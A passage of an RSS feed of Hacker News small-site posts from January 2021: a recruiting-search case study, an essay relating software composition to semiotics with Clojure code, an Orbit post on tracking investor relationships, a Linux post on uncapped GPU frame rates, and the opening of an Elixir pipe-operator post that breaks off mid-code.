</p><p>Rather than simply providing keywords, we ask recruiters to use a freeform description of the candidate they are looking for. To use the Battat example above...

</p><center>
<div><p>
A conventional exact-match keyword search might look like:</p><p>&nbsp;

“<span>Python</span>”, “<span>SQL</span>”, “<span>analyst</span>”, “<span>engineer</span>” or “<span>toys</span>”
</p><p>&nbsp;
But through our search, the candidate is described as:
</p><p>&nbsp;
“A <span>data scientist</span> who has with experience with
 <span>toys</span>, <span>education</span>, or <span>children’s products</span>.”
</p></div>
</center>

<p>We use descriptions because our search understands concepts and ideas. The algorithm knows that a “<span>data scientist</span>” is a person that is likely to know languages like “<span>Python</span>”, “<span>SQL</span>”, or others and takes on roles such as an “<span>analyst</span>” or “<span>engineer</span>”. By teaching the algorithm to seek out candidates who have experience with “<span>toys</span>”, “<span>education</span>” and “<span>children’s products</span>”, we can find people with relevant experience in related areas like “gaming” or “youth development”.

</p><p>Another way to think about this interface is that the recruiter simply has to <i>write</i> an answer to the question, “What sort of candidate are you looking for?” You need not worry about the specific structure of your response, or fitting keywords into specific parts of a search form. The above example could easily be “A former toy designer interested in analytics” or “A multilingual French-speaker who can design products and analyze data.”

</p><p>Our goal is to give the algorithm an idea of what type of candidate to look for. It will identify and make connections between concepts to find the strongest candidates. It is not limited by specific keywords. This means that a recruiter or hiring manager saves time by automating searches, while generating a broader diversity of qualified candidates.

</p><p><b>2. Search the whole resume, not just skills lists or keywords</b>

</p><p>Our semantic approach makes it easier for us to scan an entire resume to understand the person as a whole. For instance, a candidate might outline an interest in “children’s products” in one part of their resume, but not include this in their core skillsets elsewhere. This semantic approach tracks the <i>entire</i> resume and scores the <i>themes</i> that come up rather than just individual skills or keyword flags.

</p><p><a name="results"></a>The Result: 26 Days for Time-to-Hire and a Great Candidate Experience

</p><p>Maison Battat is a family-owned toy company that encourages kids to be bold, curious, and playful. For over 45 years, they have offered a range of engaging toys for babies, toddlers, and young children including Driven™ tough trucks to dolls of Our Generation™.

</p><p>Battat wanted to hire a unique candidate with experience in marketing, e-commerce, data science and analytics. They sought out someone who was a self-starter, fast learner, proficient in another language, has lived abroad, and shares their passion for improving the lives of children through play and education.

</p><p>Our text mining approach above was used to analyze over 1,000 data science candidate profiles. The top result was Sogra, a bilingual data analyst with international experience. Importantly, she was the ultimate self-starter having created an award-winning smart toy while she was working at a toy startup.

</p><p>Sogra was the first and only candidate interviewed – she was perfect for the role. Not only was the role filled in 26 days, but both employer and employee were thrilled with the significantly easier process and speedy approach.

    </p></div>

    </div>

    
  </div><div>
   <div>

     

     <div>

<p>“Phase reached out to me about a data analyst role at a toy company. Two weeks after I was introduced to the hiring manager, I accepted their job offer. I’m excited to have a data role that leverages my background as a toy designer. I feel amazing!”

</p><center></center>

<center><img src="https://joinphase.com/person_sogra.jpg"></center>

     </div>

     <div>

<p>“Phase has been a fantastic talent partner for our company. We hired the first candidate they sent us -- she was experienced in our industry and had a great analytics background. We went from first candidate introduction to first day on the job in 26 days.”

</p><center><p>Guillaume<br>Head of Amazon Business Unit,<br>Maison Battat<br>&nbsp;</p></center>

<center><img src="https://joinphase.com/person_guillaume.jpg"></center>

     </div>

     

    </div>
  </div></div>]]>
            </description>
            <link>https://joinphase.com/talent-acquisition-nlp</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780588</guid>
            <pubDate>Thu, 14 Jan 2021 18:58:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Composition is Interpretation]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780502">thread link</a>) | @jashkenas
<br/>
January 14, 2021 | https://ideolalia.com/essays/composition-is-interpretation.html | <a href="https://web.archive.org/web/*/https://ideolalia.com/essays/composition-is-interpretation.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

	

	<div>
		<article>
			<p>Every useful process goes through at least one iteration of pulling data into scope, transforming the data, and pushing that data into another scope.<sup id="fnref:process" role="doc-noteref"><a href="#fn:process">1</a></sup>  Consider <code>grep</code>: it reads a line from <code>stdin</code>, examines the line to see if it should be forwarded to <code>stdout</code>, and repeats until <code>stdin</code> is exhausted.  Conversely, <code>cat</code> isn’t independently useful; it only exists to forward the filesystem into another process, which may simply be our terminal.</p>

<p>In almost every case, the transformation of a useful process is <strong>reductive</strong>; it emits less than it consumes.  When a process has a larger volume of output than input, it’s generally providing a different (and ostensibly more useful) representation of its input.  Examples of this include <code>gunzip</code> and a program which, given a seed value, emits a neverending stream of pseudorandom numbers; both are only useful when placed upstream of another process.</p>

<p>For sufficiently small inputs, this might be useful on its own.  We can uncompress a small gzipped file and read it in the terminal, or swap the delimiters in a small CSV file for HTML tags and look at it in the browser.  But few datasets are intrinsically small; if we’re able to take in our data at a glance today, we shouldn’t expect to be so lucky tomorrow.</p>

<p>This reduction of our input data isn’t arbitrary; we are distilling it down to its meaning, in context.  If we’re concerned on the errors in our logs, we lose nothing by filtering out everything else.  If we’re concerned with the number of errors day-over-day, we lose nothing by reducing each log file down to a single number.  This is the essence of <strong>interpretation</strong>, as defined within the field of <a href="https://en.wikipedia.org/wiki/Semiotics">semiotics</a>: the transformation of one <a href="https://en.wikipedia.org/wiki/Sign_(semiotics)">sign</a> to a related sign, which often exists within a different <a href="https://en.wikipedia.org/wiki/Sign_system">system</a> of signs.</p>

<p>Our colloquial understanding of interpretation captures most of this; we are assigning meaning to something.  This process is subjective, and largely arbitrary; we are free to assign whatever meaning we like.  There are often multiple useful interpretations, and we can consider them together to better understand what we’re interpreting.</p>

<p>Semiotics also tells us that each meaning is itself just another sign, which can be interpreted in turn.  This idea, called <em>unlimited semiosis</em> in modern semiotics, was considered very unintuitive when it was first suggested in the 19th century by Charles Peirce.  In the context of software, however, it’s self-evident: each function interprets its inputs, yielding a result that can be interpreted by other functions, and so on.  There is no obvious or necessary end to this process; at some point we simply share our results with the outside world, allowing someone else to continue the chain of interpretation.</p>

<p>Meaning is created by combining software and data.  Data, by itself, is inert.  Software, by itself, is only a method for interpretation.  Software interprets data, but the converse is also true.  Different inputs will take different paths, and yield different meanings; our software is interpreted by the data it’s given.</p>

<p>This inverted perspective is useful when we look at how pieces of software are combined to create a whole.  When one function calls another, it is interpreting the purpose of the function it calls.  It is assigning meaning, in context.</p>

<p>Consider this expression, which removes all the bad values from a sequence of values:<sup id="fnref:clojure" role="doc-noteref"><a href="#fn:clojure">2</a></sup></p>



<p>The <code>remove</code> function, on its own, is highly abstract; it treats all possible predicates and all possible sequences as interchangeable.  By calling it with a specific predicate, we have made it more concrete.  As we further compose upstream, and the meaning of <code>s</code> becomes more defined, so too does the meaning of our expression.  If we think <code>(remove bad? ...)</code> lends itself to multiple interpretations, by multiple sequences, we might even give it a name:</p>

<div><div><pre><code><span>(</span><span>def</span><span> </span><span>good</span><span> </span><span>(</span><span>partial</span><span> </span><span>remove</span><span> </span><span>bad?</span><span>))</span><span>
</span></code></pre></div></div>

<p>As we compose functions, our program’s interpretation of its input becomes increasingly abstract; by filtering out <code>bad?</code> values, we treat any interleaving of those values as if they were the same.</p>

<p>Not every function, however, makes an equal contribution to this growing abstraction; <code>remove</code> is just a different idiom for <code>filter</code>:</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>remove</span><span> </span><span>[</span><span>predicate</span><span> </span><span>s</span><span>]</span><span>
  </span><span>(</span><span>filter</span><span>
    </span><span>(</span><span>complement</span><span> </span><span>predicate</span><span>)</span><span>
    </span><span>s</span><span>))</span><span>
</span></code></pre></div></div>

<p>Likewise, <code>complement</code> just negates a function’s return value, turning <code>false</code> to <code>true</code> and vice-versa.  These functions do not assign meaning, they attempt to preserve it in a different form.  Rather than interpreting, they are <strong>translating</strong>.</p>

<p>Of course, any semiotician will tell you that <a href="https://www.orionbooks.co.uk/titles/umberto-eco/mouse-or-rat/9781780226279/">translation isn’t easy</a>, and some meaning is invariably lost along the way.  But these strata in our codebases, which attempt to translate rather than interpret, are qualitatively different; they are what we call “glue code.”</p>

<p>This, however, only defers the act of interpretation to a higher strata.  Our code exists to be interpreted, either by data or by other code composed atop it.  We leave room for interpretation using two fundamental mechanisms: function references and conditional execution.</p>

<p>Both of these mechanisms allow a function’s inputs to influence its execution.  Consider this implementation of <code>filter</code>:</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>filter</span><span> </span><span>[</span><span>predicate</span><span> </span><span>s</span><span>]</span><span>
  </span><span>(</span><span>cond</span><span>
    </span><span>(</span><span>empty?</span><span> </span><span>s</span><span>)</span><span> 
    </span><span>[]</span><span>
    
    </span><span>(</span><span>predicate</span><span> </span><span>(</span><span>first</span><span> </span><span>s</span><span>))</span><span> 
    </span><span>(</span><span>cons</span><span> 
      </span><span>(</span><span>first</span><span> </span><span>s</span><span>)</span><span> 
      </span><span>(</span><span>recur</span><span> </span><span>predicate</span><span> </span><span>(</span><span>rest</span><span> </span><span>s</span><span>))))</span><span>
      
    </span><span>:else</span><span>
    </span><span>(</span><span>recur</span><span> </span><span>predicate</span><span> </span><span>(</span><span>rest</span><span> </span><span>s</span><span>)))</span><span>
</span></code></pre></div></div>

<p>First we check if the sequence is empty; if so, we return an empty sequence.  If it isn’t empty, we check if the first element satisfies the <code>predicate</code>; if so, we prepend it onto the result of filtering the rest of the sequence.  Otherwise, we omit the element from our result.</p>

<p>The first clause is simple conditional execution; given an empty sequence, <code>filter</code> will short-circuit.  The second clause is both a function reference and conditional execution; <code>filter</code> will call whatever <code>predicate</code> we’ve provided, and use the returned result to choose one of two branches.</p>

<p>But these are implementation details; the person calling <code>filter</code> should be able to focus on its semantics, not the precise way it uses its inputs.  As implementors, first we decide what sorts of interpretations our function will allow, and then we determine what minimal set of inputs will allow those interpretations.</p>

<p>In the above implementation, for instance, we don’t wrap each recursion in Clojure’s <a href="http://clojure-doc.org/articles/language/laziness.html#benefits-of-lazy-sequences"><code>lazy-seq</code></a> macro, meaning the entire filtered sequence is eagerly computed.  If we had made it lazy, that would allow for the code atop <code>filter</code> to have more control over where and when each element of the inputs sequence is processed.  Alternately, if we wanted to remain eager, we could have exposed a way for the code invoking <code>filter</code> to control what sort of collection it constructed, rather than always returning a <code>cons</code>-based list.</p>

<p>A broader range of possible interpretations isn’t necessarily better; simplicity has its own benefits.  If we’re happy discarding our code tomorrow, we can focus entirely on our needs today.  If we want our code to survive a bit longer, however, or even be a general-purpose library, we need to be more expansive.</p>

<p>In general-purpose code, we should rely on function references wherever possible.  In addition to the first-class functions that are common in Clojure, these encompass any object instance with one or more associated methods.<sup id="fnref:closures" role="doc-noteref"><a href="#fn:closures">3</a></sup>. Function references provide an <strong>open</strong> mechanism for interpretation; to extend the set of possible interpretations, you just have to write your own function.</p>

<p>Conditional execution, conversely, is a <strong>closed</strong> mechanism; to extend the set of possible interpretations we need to edit a preexisting function.  In general-purpose code, this is almost always driven by some sort of open classifier function, which reduces all possible values down to a finite set of categories.  In Java, for instance, <code>equals</code>, <code>compareTo</code>, and <code>hashCode</code> reduce their inputs down to 2, 3, and 2<sup>32</sup> categories, respectively.</p>

<p>In some cases, general-purpose code may also have conditional execution based on internal datatypes.  The semantics of a red-black tree, for instance, are entirely driven by an externally provided ordering function, but its internal bookkeeping will have <a href="http://matt.might.net/papers/germane2014deletion.pdf">lots</a> of <code>if</code>s or <code>match</code>es dealing with red and black nodes.</p>

<p>If your code has conditional execution based on public datatypes, however, it’s not meant to be general purpose; it’s what we call “business logic.”  This is the upper strata of our application, interpreted by data rather than other code.  Here, the closed nature of conditional execution is useful; we can understand the meaning of a given input by looking at a single point in our codebase.  What endpoints does our API offer?  Just look at the file where all of the routes are defined.</p>

<p>Almost anyone who writes software for a living can tell the difference between glue code, library code, and business logic.  The first time we heard each term, it was fairly clear from context and the names themselves what was being described.  If someone doesn’t understand, we assume they’ll figure it out soon, just like we did.</p>

<p>We may have a solid <a href="https://en.wikipedia.org/wiki/Tacit_knowledge">tacit understanding</a> of these concepts, but would struggle to explain them, and how they relate to each other.  Semiotics seems to provide a framework that can formalize and correlate this knowledge.  Put another way, I believe every skilled software designer has an innate, mostly undeveloped talent for applied semiotics, and I’m curious what would happen if they tried to develop it.</p>

<p>Unfortunately, I don’t think simply reading <a href="https://iupress.org/9780253202178/a-theory-of-semiotics/">a seminal text on semiotics</a> will suffice; the interpretation done by software is vastly more reductive than that done by humans.  When we use the idea of library to denote a book, or vice-versa, the amount of detail in our mental conception changes very little, if at all.  In many contexts, they will have very similar connotations.  But in a computer, a library-sized dataset is not an abstract symbol of knowledge; it’s a library’s worth of data, which is not at all the same as …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ideolalia.com/essays/composition-is-interpretation.html">https://ideolalia.com/essays/composition-is-interpretation.html</a></em></p>]]>
            </description>
            <link>https://ideolalia.com/essays/composition-is-interpretation.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780502</guid>
            <pubDate>Thu, 14 Jan 2021 18:53:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My data-centric approach to tracking investor relationships]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780497">thread link</a>) | @mooreds
<br/>
January 14, 2021 | https://orbit.love/blog/my-data-centric-approach-to-tracking-investor-relationships/ | <a href="https://web.archive.org/web/*/https://orbit.love/blog/my-data-centric-approach-to-tracking-investor-relationships/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>“Let me know how I can be helpful.”</strong></p><p>This phrase has become something of a <a href="https://vcstarterkit.substack.com/p/in-defense-of-let-me-know-how-i-can">caricature of itself</a> among VCs, right up there with Patagonia vests and coffee meetings at The Creamery.</p><p>The good news is that, despite the jokes, most investors I've spoken with seem to really mean it (and yes, vests really <em>are </em>a<em> </em>practical choice in SF).</p><p>So even though the phrase has become a bit of a meme, I <em>actually am</em> interested in understanding who has been helpful over time.</p><p>Personal chemistry matters a lot in any relationship, but in choosing which investors to work with, I like to couple that kind of qualitative information with important quantitive data as well. In other words, I want to know whom I get along with as well as who's helping out in the ways they've said they would.</p><p><strong>In this article, I’ll share with you my specific workflows for keeping track of key moments in relationship building</strong> so that you’ll always have confidence about where things stand with current and potential investors.</p><h2>My process</h2><p>The approach is simple. I record key moments in each relationship, like when an investor makes a customer intro, refers a potential candidate, or helps out in some other way.</p><p>By keeping track of those moments over time, I can take an objective look at how we're working together in light of these specific actions—who's delivering on offers to make intros? who's providing meaningful input?</p><p>I've found that this kind of data couples nicely with the more implicit qualitative aspects of the relationship.</p><p>So what tool is right for managing all this?</p><p>On the surface, this may seem like a job for a CRM, but I've found that <strong>traditional CRMs don’t work for this.</strong></p><p>I’ve tried loads of them, and have always found the experience lacking. They’re usually premised on stages of a pipeline and expected deal value, and are more interested in <em>leads</em> and <em>accounts</em> than individuals.</p><p>Orbit, on the other hand, is based on the <a href="https://github.com/orbit-love/orbit-model">Orbit Model</a> and on <strong><em>activities</em></strong> — who’s doing what, and when did they do it?</p><p><strong>It turns out this is the perfect data model for understanding how a relationship grows over time. </strong>That’s why I’ve been using Orbit as my personal CRM.</p><p>The result? Rich context on the people in my orbit, as well as a way to quickly see how different folks are engaging (or not), and how:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/f282ac371e18c25a3c5dc6c81ffb3da02441e81d-2604x940.png" alt="Screenshot of the Orbit Members Table" title="Orbit Members Table Example"></p><h2>Key ideas</h2><p>Before getting into the workflows, let’s cover two important concepts in Orbit: Members and Activities.</p><p>A <strong>Member</strong> is a person added to your Orbit workspace: manually, via an integration, or via API. Each member has a profile page where you can see lots of data about that member as well as a timeline of activities they’ve done, content they’ve created, and more.</p><p><strong>Activities</strong> are things a member does, like mentioning you on Twitter, attending an event, meeting with you, or, as in this case, doing things like making intros, or anything else you want to keep track of.</p><p>Activities will appear chronologically on a member’s profile, as well as in a global stream for your entire workspace.</p><p>The combo of members + activities tells you who’s doing what, when they did it, and where.</p><blockquote>For more on how we use Orbit to build Orbit, <a href="https://orbit.love/blog/how-we-use-orbit-to-build-orbit/">check out this article</a>.</blockquote><h2>Tracking social mentions as activities</h2><p>Activities are added to your workspace manually or via an integration.</p><p>Orbit offers several <a href="https://orbit.love/integrations/">integrations</a> that add members and activities to your workspace automatically. Some are better for companies or large communities, e.g. our GitHub and Discourse integrations.</p><p><strong>For individuals, the Twitter integration is really handy</strong>. It automatically aggregates mentions and follows of your account, as well as any keywords you’d like to track.</p><p>This can be helpful for general relationship building, but also for understanding which VCs are engaging on social by following you, mentioning you in relevant conversations, and sharing your content.</p><p>Here’s my personal workspace timeline showing Twitter activity alongside the custom activities we'll discuss below:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/0266d1a17d14ba1742960a30bfebbf5cd81e14e1-1040x1050.png" alt="Screenshot of the Orbit Activity Feed" title="Orbit Activity Feed"></p><p>Any time an investor follows or mentions me, I add a tag to their profile to designate them as an investor:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/4749c8f7f9eaa1747d92266247112829ccddcd78-518x282.gif" alt="Animation of adding a tag to a member profile in Orbit" title="Orbit Tag Demo"></p><p>Tags are great because you can sort and filter views and reports based on tags. For example, you can filter the Members table by the investor tag to see only investors, or filter the Activity feed by the same tag to see only activities from folks with that tag.</p><h2>Tracking specific investor activities</h2><p>In addition to automated activity tracking from integrations and the API, you can also manually add activities.</p><p>Manual work isn’t ideal, and we try hard to reduce data entry as much as possible, but for some things, like high-value non-recurring activities, it’s unavoidable.</p><p><strong>I keep track of a few different activities across my investor relationships:</strong></p><ul><li>Customer intros made</li><li>Candidate intros made</li><li>Meetings (these aren’t necessarily helpful, but I still like to have context)</li></ul><p>Here’s a timeline of an investor who’s made two helpful intros:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/b8246312af0ebccbe765e8e93b02d19f21bd60c7-1999x826.png" alt="Screenshot showing an Orbit member prpofile" title="Profile of an investor"></p><p>Adding activities is pretty fast. The title is the only thing required, though I usually include relevant context in the description field, and define an “activity type.” In the screenshot above, the activity types are <em>meeting</em> and <em>intro</em>.</p><p>In addition to tags, activity type is another way to filter and sort, as we’ll see later.</p><p>You can track literally anything you want, so feel free to get creative beyond my examples here.</p><h2>Adding notes</h2><p>Sometimes you want to add context to a profile that’s not necessarily associated with an activity. In those cases, you’d just add the content to a note:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/cad465e65d62216810cfdc56604384d20ff0cb14-1426x452.png" alt="Screenshot showing a note on the Orbit timeline. The note says: &quot;REDACTED has always been super responsive to investor updates, which is much appreciated, as well as responsive to texts and c…&quot;" title="Note detail view"></p><p>Even better, Orbit indexes the text of your notes, so you can find them later via Search.</p><h2>The impact of tracking relationship growth</h2><p>Now that you’ve spent the time to track all your key relationship moments, you can sort your investors by Love, which illustrates their engagement over time, and Reach, which is a function of their Twitter followers:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/f282ac371e18c25a3c5dc6c81ffb3da02441e81d-2604x940.png" alt="Screenshot of the Orbit Members Table" title="Orbit Members Table Example"></p><p>Remember Activity Types from earlier? You can sort this table (and other views) by those types. For example, <strong>it’s trivial for me to see a list of folks who’ve made intros</strong>:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/a508809009b04327cff53fc61a00fd7496471e3d-1999x436.png" alt="Screenshot of the Filter UI" title="Filtering activity types"></p><p>You can also use Search to build complex queries, like investors who have done 10+ activities who live in New York, or folks who have made customer intros who also follow me on Twitter.</p><p>The use case for search depends greatly on your situation, but suffice it to say that, as you add data to Orbit over time, the data—and your ability to find it—becomes increasingly powerful.</p><h2>Bonus section: charts!</h2><p>Reporting is probably less important for your personal use case than for a company’s, but that doesn’t mean they’re not fun to look at! If you've been using activity types consistently, Orbit can show you your trend of key activities over time, whether that's intros, meetings, or whatever's important.</p><p>Here’s an example of Activities by Type from the main Orbit workspace:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/91833ac69a61f25e41bf575c60cabbed6aa46348-1999x1070.png" alt="Screenshot of a chart showing activities over time" title="Activities chart"></p><p>We also track Twitter follows and mentions:</p><p><img src="https://cdn.sanity.io/images/cad8jutx/production/6d7904ad2eb11c3ecc6f932307d46a4022d315a1-1999x976.png" alt="Screenshot showing Chart of Twitter activity" title="Chart of Twitter activity"></p><h2>Who actually has been helpful?</h2><p>So what are the outcomes of all this? For one, you’ll have loads of context about current and potential investors to help you better build and navigate those relationships.</p><p><strong>You’ll also have a clear record of how different folks have tangibly worked to impact your business.</strong> By the time you’re ready to raise your next round, you’ll be able to rely on more than just gut feeling or promises made.</p><p>Investor relationships last many years, so I think it’s worth spending a little time early on to track these key moments in service of helping you make better decisions about your long-term partners.</p><p><strong>Want to try this? </strong>Shoot me a DM on Twitter <a href="https://twitter.com/patrickjwoods">@patrickjwoods</a> with your email address and a note about what you’re working on, and I’ll send over setup info. Good luck!</p></div></div>]]>
            </description>
            <link>https://orbit.love/blog/my-data-centric-approach-to-tracking-investor-relationships/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780497</guid>
            <pubDate>Thu, 14 Jan 2021 18:52:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Some programs in Linux fail to limit FPS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780283">thread link</a>) | @vegadw
<br/>
January 14, 2021 | https://opguides.info/posts/slowdown/ | <a href="https://web.archive.org/web/*/https://opguides.info/posts/slowdown/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  
  <h5>January 14, 2021</h5>



  

  


  <p>I use <a href="https://vcvrack.com/">VCV Rack</a> a lot. I normally use it on Windows as running VSTs in Linux is still a bit of a PITA and If I’m going to make music I want to have access to all of my tools. However, I still want to be able to use VCV on Linux for processing guitar when taking breaks from working on other things without having to reboot over to Windows.</p>
<p>Unfortunately, for a good while now VCV has had an annoying bug. I’m not sure when the bug first appeared, but at some point it started eating my GPU. Like, absolutely wrecking it.</p>
<p><img src="https://opguides.info/VCVfail.png" alt=""></p>
<p>
    <a href="https://github.com/clbr/radeontop">Radeontop (GitHub)</a>
</p>
<p>It was still technically usable, in fact it ran butter smooth…</p>
<p><img src="https://opguides.info/fps.png" alt=""></p>
<p>Oh wait, I wonder if killing <a href="https://github.com/yshui/picom">picom</a>, the X11 compositor I use will help</p>
<p><img src="https://opguides.info/nocomp.png" alt=""></p>
<p>Nopeeee.</p>
<p>Alright, obviously this is far from ideal. I actually only knew to check the FPS because of an interesting quirk, I think when the FPS got this high my GPU was getting jobs at that rate, so 930ish times per second, but still finishing them quickly enough to cause the GPU load to constantly change going 100% â†’ 0% â†’ 100% â†’ 0% … in a loop, really fast. It caused the physical GPU, an AMD Vega56, to whine in my tower. I don’t <em>think</em> it was <a href="https://en.wikipedia.org/wiki/Electromagnetically_induced_acoustic_noise">coil whine</a>, but it was also very loud and sounded similar.</p>
<p>First I tried just changing the FPS target value in VCV and then I tried playing with settings in the <code>settings-v1.json</code> file, but nothing worked.</p>
<p>My next attempt to fix it was to try rebooting and loading my system with the Zen Linux kernel as I knew it used a different scheduler and did some extra stuff for real time computation (nice to have anyway when doing audio stuff like VCV).</p>
<p>Unfortunately, that was a bust. Still rocking the 930 FPS.</p>
<p>From here I had to ask for more help. Thankfully, a friend in my modular music chat on telegram was able to point me to a few ideas. I ran <code>glxinfo</code>, made sure everything looked sane, and it was. Next I tried using <code>LIBGL_THROTTLE_REFRESH=1</code> and <code>WGL_SWAP_INTERVAL=1</code> with no luck either.</p>
<p>Failing other ideas I Googled “linux limit frame rate environment variables” and one of the top results was <a href="https://gitlab.com/torkel104/libstrangle">libstrangle (GitLab)</a> which limits frame rate by using <code>LD_PRELOAD</code> to dynamically link it’s own library that does the FPS limiting. This reeks of hacky bullshit. But I’m <em>always</em> down for some hacky bullshit. For S&amp;Gs I check, and `lo and behold it’s in the AUR.</p>
<p><img src="https://opguides.info/strangle.png" alt="strangle"></p>
<p>I still have no idea what’s going on. The easy guess is “You have a Vega56, it’s a weird GPU with HBM2” and, yeah, that makes sense, but then there’s <a href="https://github.com/VCVRack/Rack/issues/1829">This Issue</a> in VCV Rack’s GitHub repo where someone else is having the same problem on an Nvidia card on Ubuntu. I’m using an AMD Card on Arch! Other than the commonality of Linux, these systems couldn’t be much more different.</p>
<p>That issue shows the original poster had traced it down to <a href="https://github.com/VCVRack/Rack/blob/e334902e8addf96ad726192c665d806f0952def0/src/window.cpp#L415">one line</a>, but I’m hesitant to accept that explanation when VCV works fine for me on Windows and the issue has no other comments from other people with the same issue.</p>
<p>prior to this fix, VCV could outright lockup my entire system as my GPU screamed bloody murder, but it got me thinking- while VCV is by far the most violent I’ve seen this issue get, I think I’ve seen it elsewhere, and yep:</p>
<p><img src="https://opguides.info/nuklearfps.png" alt="nuklearfps"></p>
<p>This is the example project for <a href="https://github.com/Immediate-Mode-UI/Nuklear">Nuklear</a>, “A single-header ANSI C immediate mode cross-platform GUI library”, exhibiting the same issue. I’m curious how many projects based on Nuklear this affects.</p>
<p>LibStrangle again works to fix this, but without it my graphic card still makes an annoying whine, a whine that I don’t get under even very high load when gaming.</p>
<p>I won’t include anymore FPS screenshots, but I get the exact same behavior in <a href="https://users.notam02.no/~kjetism/radium/">Radium</a>, a neat tracker-like Digital Audio Workstation.</p>
<p>I suspect there are many, many more. I’m not going to go checking every program on my system, but I found this behavior weird enough to be worth documenting.</p>

</article></div>]]>
            </description>
            <link>https://opguides.info/posts/slowdown/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780283</guid>
            <pubDate>Thu, 14 Jan 2021 18:38:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Sublime Developer Efficiency of Elixir, Phoenix and LiveView]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25780063">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | https://amattn.com/p/the_sublime_developer_efficiency_of_elixir_phoenix_and_liveview_part_1.html | <a href="https://web.archive.org/web/*/https://amattn.com/p/the_sublime_developer_efficiency_of_elixir_phoenix_and_liveview_part_1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<!-- The top of the page -->
	
	
	<table>
	<tbody><tr>
		<td>
	<h2 id="subhead">SW engineering, engineering management and the business of software</h2>
		</td>
		<td>
<!-- Begin MailChimp Signup Form -->

<!--End mc_embed_signup-->
		</td>
	</tr>
	</tbody></table>


	<br>

<!-- The middle of the page -->


	
	
	
	
	
	
	<p><span>Editor’s note: This is part one of a short series. You can find <a href="http://amattn.com/p/elixir_phoenix_the_business_case_for_liveview_strong_enough_to_change_how_you_staff_your_dev_team.html">part two</a> here. <span></span></span></p>

<p>I’ve spent the last month and change working on a <a href="https://habit.show/">little side project</a>.</p>

<p>The interesting thing about this one is that it’s written completely in <a href="https://elixir-lang.org/">Elixir</a>.  This is a post about my experience doing so.</p>

<p>Elixir is a language that came out of the heyday of Ruby on Rails about a decade ago.  It was originally billed as “Ruby on the Erlang VM”, trying to blend the best of both worlds.  Spoiler, I believe it has largely succeeded.</p>

<p>It’s still got quite a bit of Ruby influence, but overall, it’s much more functional.  You will see maps, filters and reduce’s all over your code base.</p>

<p>From the Erlang side of the family, you’ll see a lot. There’s no mutability.  Variables cannot be changed, you can only create new ones from combining or transforming existing.  Pattern Matching is everywhere and it’s still quite powerful.  You can trivially call down to Erlang primitives whenever you need to.</p>

<p>The Ruby influence is more in style and syntactic sugar.  You’ll see your <code>def</code>’s and <code>end</code>’s and <code>-&gt;</code>’s.  You can skip parenthesis around function arguments if it doesn’t introduce ambiguity.  There’s no early return, you always return the last expression.  Map and list syntax will be fairly familiar.  The @ prefix denotes attributes / decorators.  Atons.</p>

<p>It’s got some quirks.  The native list primitive is a classic linked list, not an array.  This means that prepend is cheap, but count, insert, append is expensive.  It also means you can do head/tail car/cdr operations quite easily.  Keyword lists as a weird list/map hybrid.</p>

<h2>Digging into the pipe operator</h2>

<p><a name="b1"></a>
The <code>|&gt;</code> operation is a particularly good example.  To most newcomers, it’s a weird, inscrutable symbol whose operation isn’t easily intuited.<sup><a href="#1">1</a></sup>  Yet once you get used to it, there’s quite a bit of elegance to it, and even historical reference to the pipe operation in the shell.</p>

<p>For those new to the language it works like this:  take the input of the pipe operation (x below) and pass it as the first argument of the target function of the pipe operator.</p>

<pre><code>x
|&gt; function(y, z)
</code></pre>

<p>is equivalent to</p>

<pre><code>function(x, y, z)
</code></pre>

<p>The elegance comes from chaining these together like so;</p>

<pre><code>x
|&gt; function(y, z)
|&gt; other_function(a, b)
|&gt; yet_another_function(c)
</code></pre>

<p>If this is the last expression in a function you return the results of the final <code>yet_another_function</code></p>

<p>You can also bind it to a variable like so:</p>

<pre><code>final_output =
  x
  |&gt; function(y, z)
  |&gt; other_function(a, b)
  |&gt; yet_another_function(c)
</code></pre>

<p>The pipe metaphor breaks down as you start with x, do a ton of transformation on it and your eyes have to scan way back to the beginning to see what variable you are assigning the final results to.</p>

<p>It kind of micro-example of the entire macro-experience of using Elixir:</p>

<ul>
<li>It’s quirky</li>
<li>There’s a learning curve</li>
<li>Taking the time to climb that curve can result in elegant solutions</li>
<li>The endgame is high developer efficiency</li>
</ul>

<h2>An actual example</h2>

<p>To see an actual code snippet with pipes in action:</p>

<pre><code>collected_errors =
  Date.range(start_date, yesterday)
  |&gt; Enum.to_list()
  |&gt; Enum.filter(fn _ -&gt;
    random_number = :rand.uniform(100)
    random_number &lt; 75
  end)
  |&gt; Enum.map(fn date -&gt;
    make_map_of_attrs(date, user, some_bool, some_int)
  end)
  |&gt; Enum.reduce([], fn entity_attr, all_errors -&gt;
